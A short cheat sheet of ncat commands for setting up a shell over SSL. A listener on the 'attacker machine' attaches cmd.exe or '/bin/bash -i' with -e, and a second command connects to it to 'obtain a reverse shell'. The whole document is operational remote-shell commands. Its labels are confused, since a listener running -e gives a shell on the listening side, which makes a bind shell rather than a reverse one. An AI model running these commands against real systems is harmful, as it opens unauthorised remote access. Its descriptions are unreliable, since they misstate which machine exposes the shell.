## Setup a Netcat listener on the attacker machine

Win: `ncat -lvp port -e cmd.exe --allow ip --ssl` 
Linux: `ncat -lvp port -e '/bin/bash -i' --allow ip --ssl`

where `port` is any port number, and `ip` is the other machine IP.

## To obtain a reverse shell on the other machine

`ncat -v ip2 port --ssl`

where `port` is any port number, and `ip2` is the other machine IP.
